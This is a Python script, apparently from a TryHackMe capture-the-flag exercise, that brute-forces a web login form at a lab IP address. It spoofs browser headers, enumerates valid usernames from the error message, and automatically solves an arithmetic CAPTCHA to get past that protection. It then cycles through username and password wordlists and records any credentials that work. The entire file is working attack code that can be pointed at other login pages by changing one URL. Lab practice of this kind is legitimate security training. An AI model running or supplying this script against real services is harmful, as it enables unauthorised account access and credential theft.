# Medium Article for explanation: https://medium.com/@Sle3pyHead/capture-ctf-notes-tryhackme-dab4c46fff14

import requests
import re
import time

LOGIN_URL = 'http://10.10.99.186/login'  # Update to your actual URL

# Add proper headers to mimic a real browser
headers = {
    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/109.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate",
    "Content-Type": "application/x-www-form-urlencoded",
    "Connection": "close",
    "Upgrade-Insecure-Requests": "1",
}

def solve_captcha(question_text):
    """Extract and solve arithmetic CAPTCHA from response text"""
    # Simple regex to find number-operator-number pattern anywhere in the text
    match = re.search(r"(\d+)\s*([\+\-\*/])\s*(\d+)", question_text)
    if not match:
        raise Exception("CAPTCHA pattern not found")
    
    num1, operator, num2 = int(match.group(1)), match.group(2), int(match.group(3))
    
    if operator == '+':
        return str(num1 + num2)
    elif operator == '-':
        return str(num1 - num2)
    elif operator == '*':
        return str(num1 * num2)
    elif operator == '/':
        return str(num1 // num2)  # Integer division
    else:
        raise Exception(f"Unknown operator: {operator}")

def user_does_not_exist(response_text):
    """Check if user doesn't exist"""
    return "does not exist" in response_text.lower()

def is_success(response_text):
    """Check if login was successful"""
    # Adjust this condition based on what indicates success for your target
    return ("does not exist" not in response_text.lower() and 
            "captcha" not in response_text.lower() and
            "invalid" not in response_text.lower() and
            "error" not in response_text.lower())

def main():
    """Main brute force function"""
    
    # Load credentials
    try:
        with open('usernames.txt', 'r') as f:
            usernames = [line.strip() for line in f if line.strip()]
        
        with open('passwords.txt', 'r') as f:
            passwords = [line.strip() for line in f if line.strip()]
            
        print(f"Loaded {len(usernames)} usernames and {len(passwords)} passwords")
        
    except FileNotFoundError as e:
        print(f"Error loading files: {e}")
        return
    
    session = requests.Session()
    
    for i, username in enumerate(usernames):
        for j, password in enumerate(passwords):
            print(f"[{i+1}/{len(usernames)}] [{j+1}/{len(passwords)}] Trying: {username}:{password}")
            
            # Initial login attempt
            data = {
                'username': username,
                'password': password,
            }
            
            try:
                response = session.post(LOGIN_URL, headers=headers, data=data)
                response_size = len(response.content)
                
                # Check if user doesn't exist - skip to next username
                if user_does_not_exist(response.text):
                    print(f"❌ Username {username} does not exist. Skipping...")
                    break
                
                # Check if login successful without CAPTCHA
                if is_success(response.text):
                    print(f"✅ SUCCESS: {username}:{password} (no CAPTCHA)")
                    with open('successful_logins.txt', 'a') as f:
                        f.write(f"{username}:{password}\n")
                    return
                
                # Check if CAPTCHA is required
                if "captcha" in response.text.lower():
                    print(f"🧩 CAPTCHA detected, solving...")
                    
                    try:
                        captcha_answer = solve_captcha(response.text)
                        print(f"🧮 CAPTCHA solved: {captcha_answer}")
                        
                        # Retry with CAPTCHA
                        data['captcha'] = captcha_answer
                        response = session.post(LOGIN_URL, headers=headers, data=data)
                        response_size = len(response.content)
                        
                        # Check results after CAPTCHA
                        if user_does_not_exist(response.text):
                            print(f"❌ Username {username} does not exist. Skipping...")
                            break
                        
                        if is_success(response.text):
                            print(f"✅ SUCCESS: {username}:{password} (with CAPTCHA)")
                            with open('successful_logins.txt', 'a') as f:
                                f.write(f"{username}:{password}\n")
                            return
                        else:
                            print(f"❌ Failed: {username}:{password} (size: {response_size})")
                            
                    except Exception as captcha_error:
                        print(f"🚫 CAPTCHA solving failed: {captcha_error}")
                else:
                    print(f"❌ Failed: {username}:{password} (size: {response_size})")
                
            except Exception as e:
                print(f"🚫 Request error for {username}:{password}: {e}")
            
            # Small delay to avoid being too aggressive
            time.sleep(0.2)
    
    print("❌ Failed to log in with any of the given credentials.")

if __name__ == "__main__":
    main()

